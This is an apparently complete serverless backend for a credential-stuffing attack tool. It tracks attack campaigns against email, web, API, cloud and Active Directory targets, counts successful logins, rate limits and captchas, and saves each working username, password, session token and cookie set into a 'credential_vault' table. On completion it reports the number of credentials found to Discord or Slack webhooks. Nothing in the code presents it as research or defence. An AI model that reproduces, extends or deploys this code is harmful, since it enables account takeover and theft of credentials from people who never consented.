import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_ANON_KEY') ?? '',
      {
        global: {
          headers: { Authorization: req.headers.get('Authorization')! },
        },
      }
    )

    const { data: { user } } = await supabaseClient.auth.getUser()
    
    if (!user) {
      return new Response(
        JSON.stringify({ error: 'Unauthorized' }),
        { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      )
    }

    const { action, attack_id, config } = await req.json()

    switch (action) {
      case 'create': {
        const { data, error } = await supabaseClient
          .from('supreme_combo_attacks')
          .insert({
            user_id: user.id,
            ...config
          })
          .select()
          .single()

        if (error) throw error

        return new Response(
          JSON.stringify({ success: true, attack: data }),
          { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        )
      }

      case 'start': {
        const { data, error } = await supabaseClient
          .from('supreme_combo_attacks')
          .update({ 
            status: 'running',
            started_at: new Date().toISOString()
          })
          .eq('id', attack_id)
          .eq('user_id', user.id)
          .select()
          .single()

        if (error) throw error

        return new Response(
          JSON.stringify({ success: true, attack: data }),
          { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        )
      }

      case 'pause': {
        const { data, error } = await supabaseClient
          .from('supreme_combo_attacks')
          .update({ status: 'paused' })
          .eq('id', attack_id)
          .eq('user_id', user.id)
          .select()
          .single()

        if (error) throw error

        return new Response(
          JSON.stringify({ success: true, attack: data }),
          { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        )
      }

      case 'update_progress': {
        const { progress } = config
        
        const updateData: any = {
          total_combos_tested: progress.total_combos_tested,
          successful_logins: progress.successful_logins,
          failed_attempts: progress.failed_attempts,
          rate_limited: progress.rate_limited || 0,
          captcha_hit: progress.captcha_hit || 0
        }

        if (progress.combos_per_second) {
          updateData.combos_per_second = progress.combos_per_second
        }

        if (progress.total_combos_tested > 0 && progress.successful_logins > 0) {
          updateData.success_rate = (progress.successful_logins / progress.total_combos_tested * 100).toFixed(2)
        }

        const { data, error } = await supabaseClient
          .from('supreme_combo_attacks')
          .update(updateData)
          .eq('id', attack_id)
          .eq('user_id', user.id)
          .select()
          .single()

        if (error) throw error

        if (progress.new_credentials && progress.new_credentials.length > 0) {
          for (const cred of progress.new_credentials) {
            await supabaseClient.from('combo_attack_results').insert({
                combo_attack_id: attack_id,
                username: cred.username,
                password: cred.password,
                email: cred.email,
                target: cred.target,
                is_valid: true,
                response_code: cred.response_code,
                response_message: cred.response_message,
                response_time_ms: cred.response_time_ms,
                session_token: cred.session_token,
                cookies: cred.cookies,
                account_info: cred.account_info
              })

            await supabaseClient.from('credential_vault').insert({
                user_id: user.id,
                username: cred.username,
                password: cred.password,
                email: cred.email,
                target_service: cred.target,
                session_token: cred.session_token,
                additional_info: cred.account_info,
                category: getCategoryFromAttackType(data.attack_type),
                source_attack_type: 'supreme_combo',
                source_attack_id: attack_id,
                two_factor_enabled: cred.two_factor_enabled || false
              })
          }
        }

        return new Response(
          JSON.stringify({ success: true, attack: data }),
          { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        )
      }

      case 'complete': {
        const { results } = config
        
        const { data, error } = await supabaseClient
          .from('supreme_combo_attacks')
          .update({
            status: results.error ? 'failed' : 'completed',
            completed_at: new Date().toISOString(),
            duration_seconds: results.duration_seconds,
            error_message: results.error,
            output_file_path: results.output_file_path
          })
          .eq('id', attack_id)
          .eq('user_id', user.id)
          .select()
          .single()

        if (error) throw error

        await sendNotification(user.id, 'supreme_combo_attack_complete', {
          attack_name: data.name,
          attack_type: data.attack_type,
          status: data.status,
          credentials_found: data.successful_logins,
          total_tested: data.total_combos_tested,
          success_rate: data.success_rate
        })

        return new Response(
          JSON.stringify({ success: true, attack: data }),
          { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        )
      }

      case 'stop': {
        const { data, error } = await supabaseClient
          .from('supreme_combo_attacks')
          .update({
            status: 'cancelled',
            completed_at: new Date().toISOString()
          })
          .eq('id', attack_id)
          .eq('user_id', user.id)
          .select()
          .single()

        if (error) throw error

        return new Response(
          JSON.stringify({ success: true, attack: data }),
          { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        )
      }

      default:
        return new Response(
          JSON.stringify({ error: 'Invalid action' }),
          { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        )
    }
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    )
  }
})

function getCategoryFromAttackType(attackType: string): string {
  const mapping: Record<string, string> = {
    'email_ip': 'email',
    'credential_stuffing': 'web',
    'api_endpoint': 'api',
    'cloud_service': 'cloud',
    'active_directory': 'enterprise',
    'web_application': 'web'
  }
  return mapping[attackType] || 'other'
}

async function sendNotification(userId: string, event: string, data: any) {
  try {
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )

    const { data: settings } = await supabaseClient
      .from('notification_settings')
      .select('*')
      .eq('user_id', userId)
      .single()

    if (!settings) return

    const message = `🚀 Supreme Combo Attack Complete\n` +
      `**${data.attack_name}** (${data.attack_type})\n` +
      `Status: ${data.status}\n` +
      `Tested: ${data.total_tested} | Found: ${data.credentials_found}\n` +
      `Success Rate: ${data.success_rate}%`

    if (settings.discord_enabled && settings.discord_webhook_url) {
      await fetch(settings.discord_webhook_url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '🚀 Supreme Combo Attack Complete',
            description: message,
            color: data.status === 'completed' ? 0x00ff00 : 0xff0000,
            fields: [
              { name: 'Attack Type', value: data.attack_type, inline: true },
              { name: 'Success Rate', value: `${data.success_rate}%`, inline: true },
              { name: 'Credentials Found', value: data.credentials_found.toString(), inline: true }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      })
    }

    if (settings.slack_enabled && settings.slack_webhook_url) {
      await fetch(settings.slack_webhook_url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: message })
      })
    }
  } catch (error) {
    console.error('Notification error:', error)
  }
}
